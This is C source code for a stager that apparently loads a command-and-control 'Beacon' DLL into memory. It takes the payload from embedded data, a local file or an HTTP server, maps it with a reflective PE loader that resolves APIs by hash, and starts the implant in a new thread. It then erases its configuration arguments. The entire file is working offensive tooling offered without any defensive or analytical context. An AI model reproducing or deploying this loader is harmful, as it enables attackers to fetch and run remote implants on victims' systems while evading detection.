#include "c_types.h"
#include "win_types.h"
#include "lib_memory.h"
#include "pe_image.h"
#include "rel_addr.h"
#include "errno.h"
#include "runtime.h"
#include "pe_loader.h"
#include "boot.h"

#define BOOT_MODE_V1 1

typedef struct {
    Runtime_M*  runtime;
    PELoader_M* loader;
    uint32      mode;
} BootCtx;

static DWORD bootBeacon(BootCtx* ctx);

static errno loadConfig(Runtime_M* runtime, Config* config);
static void* loadImage(Runtime_M* runtime, byte* config);
static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
static void* loadImageFromFile(Runtime_M* runtime, byte* config);
static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);

static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts);
static uint32     pe_loader_size();

errno Boot(void* ctx)
{
    // initialize Gleam-RT for PE Loader
    Runtime_M* runtime = initRuntime(GetFuncAddr(&Boot), NULL);
    if (runtime == NULL)
    {
        return GetLastErrno();
    }

    // reserved context and extended arguments
    (void)ctx;

    // store boot configuration
    Config config;
    mem_init(&config, sizeof(config));
    // initialize PE Loader for stage
    PELoader_M* loader  = NULL;
    HANDLE      hThread = NULL;
    errno err = NO_ERROR;
    for (;;)
    {
        // load config from argument stub
        err = loadConfig(runtime, &config);
        if (err != NO_ERROR)
        {
            break;
        }
        // check the Beacon version
        uint32 mode = 0;
        if (config.Version >= 0x0400 && config.Version < 0x0500)
        {
            mode = BOOT_MODE_V1;
        }
        if (mode == 0)
        {
            err = ERR_UNSUPPORTED_VERSION;
            break;
        }
        // prepare pe image data to config
        void* image = loadImage(runtime, config.Image);
        if (image == NULL)
        {
            err = GetLastErrno();
            break;
        }
        // prevent incorrect optimization
        PELoader_Cfg cfg;
        mem_init(&cfg, sizeof(cfg));
        cfg.FindAPI        = runtime->HashAPI.FindAPI_MA;
        cfg.Image          = image;
        cfg.IgnoreStdIO    = true;
        cfg.NotStopRuntime = config.TestWait;
        // load beacon image
        loader = InitPELoader(runtime, &cfg);
        if (loader == NULL)
        {
            mem_init(&cfg, sizeof(cfg));
            err = GetLastErrno();
            break;
        }
        runtime->Memory.Free(image);
        mem_init(&cfg, sizeof(cfg));
        // initialize dll before boot beacon
        err = loader->Execute();
        if (err != NO_ERROR)
        {
            break;
        }
        // create thread for boot beacon stage
        BootCtx* context = runtime->Memory.Alloc(sizeof(BootCtx));
        context->runtime = runtime;
        context->loader  = loader;
        context->mode    = mode;
        void* address = GetFuncAddr(&bootBeacon);
        hThread = runtime->Thread.New(address, context, true);
        if (hThread == NULL)
        {
            err = GetLastErrno();
            break;
        }
        if (!config.TestWait)
        {
            if (!runtime->Resource.Close(hThread))
            {
                err = GetLastErrno();
                break;
            }
        }
        runtime->Argument.EraseAll();
        break;
    }
    if (err != NO_ERROR || loader == NULL)
    {
        runtime->Core.Exit();
        return err;
    }

    // wait main thread for test stage
    if (!config.TestWait)
    {
        return NO_ERROR;
    }
    if (!runtime->Resource.Wait(hThread, INFINITE) && err == NO_ERROR)
    {
        err = GetLastErrno();
    }
    if (!runtime->Resource.Close(hThread) && err == NO_ERROR)
    {
        err = GetLastErrno();
    }

    // destroy pe loader and exit runtime
    errno eld = loader->Destroy();
    if (eld != NO_ERROR && err == NO_ERROR)
    {
        err = eld;
    }
    return err;
}

static DWORD bootBeacon(BootCtx* ctx)
{
    // copy arguments in context and free it
    Runtime_M*  runtime = ctx->runtime;
    PELoader_M* loader  = ctx->loader;
    uint32 mode = ctx->mode;
    runtime->Memory.Free(ctx);

    // call beacon entry point and it will be blocked
    switch (mode)
    {
    case BOOT_MODE_V1:
        DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
        HMODULE   hModule = (HMODULE)(loader->ImageBase);
        if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
        {
             return ERR_CALL_BEACON_ENTRY_POINT;
        }
        break;
    default:
        panic(PANIC_UNREACHABLE_CODE);
    }
    return 0;
}

static errno loadConfig(Runtime_M* runtime, Config* config)
{
    uint32 size;
    if (!runtime->Argument.GetValue(ARG_ID_VERSION, &config->Version, &size))
    {
        return ERR_NOT_FOUND_VERSION;
    }
    if (size != sizeof(uint16))
    {
        return ERR_INVALID_VERSION;
    }
    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config->Image, &size))
    {
        return ERR_NOT_FOUND_PE_IMAGE;
    }
    if (size == 0)
    {
        return ERR_EMPTY_PE_IMAGE_DATA;
    }
    if (!runtime->Argument.GetValue(ARG_ID_TEST_WAIT, &config->TestWait, &size))
    {
        return ERR_NOT_FOUND_TEST_WAIT;
    }
    if (size != sizeof(BOOL))
    {
        return ERR_INVALID_TEST_WAIT;
    }
    return NO_ERROR;
}

static void* loadImage(Runtime_M* runtime, byte* config)
{
    byte mode = *config;
    config++;
    switch (mode)
    {
    case MODE_EMBED_IMAGE:
        return loadImageFromEmbed(runtime, config);
    case MODE_LOCAL_FILE:
        return loadImageFromFile(runtime, config);
    case MODE_HTTP_SERVER:
        return loadImageFromHTTP(runtime, config);
    default:
        SetLastErrno(ERR_INVALID_LOAD_MODE);
        return NULL;
    }
}

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
{
    byte mode = *config;
    config++;
    switch (mode)
    {
    case EMBED_ENABLE_COMPRESSION:
      {
        uint32 rawSize = *(uint32*)(config+0);
        uint32 comSize = *(uint32*)(config+4);
        byte*  comData = (byte*)(config+8);
        void* buf = runtime->Memory.Alloc(rawSize);
        uint size = runtime->Compressor.Decompress(buf, comData, comSize);
        if (size != (uint)rawSize)
        {
            SetLastErrno(ERR_INVALID_COMPRESS_DATA);
            return NULL;
        }
        return buf;
      }
    case EMBED_DISABLE_COMPRESSION:
      {
        uint32 size = *(uint32*)config;
        void* buf = runtime->Memory.Alloc(size);
        mem_copy(buf, config + 4, size);
        return buf;
      }
    default:
        SetLastErrno(ERR_INVALID_EMBED_CONFIG);
        return NULL;
    }
}

static void* loadImageFromFile(Runtime_M* runtime, byte* config)
{
    databuf file;
    errno errno = runtime->WinFile.ReadFileW((LPWSTR)config, &file);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (file.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    return file.buf;
}

static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
{
    HTTP_Request req;
    if (!runtime->Serialization.Unserialize(config, &req))
    {
        SetLastErrno(ERR_INVALID_HTTP_CONFIG);
        return NULL;
    }
    HTTP_Response resp;
    errno errno = runtime->WinHTTP.Get(&req, &resp);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (resp.StatusCode != 200)
    {
        SetLastErrno(ERR_INVALID_HTTP_STATUS_CODE);
        return NULL;   
    }
    if (resp.Body.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    runtime->WinHTTP.FreeDLL();
    return resp.Body.buf;
}

static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
{
    uintptr base = (uintptr)(GetFuncAddr(&InitPELoader));
    uintptr addr = base + pe_loader_size();
    typedef Runtime_M* (*InitRuntime_t)(void* boot, Runtime_Opts* opts);
    InitRuntime_t init = (InitRuntime_t)addr;
    return init(boot, opts);
}

// the size will be replaced by builder or generator
#pragma optimize("", off)
static uint32 pe_loader_size()
{
    return STUB_PE_LOADER_SIZE;
}
#pragma optimize("", on)
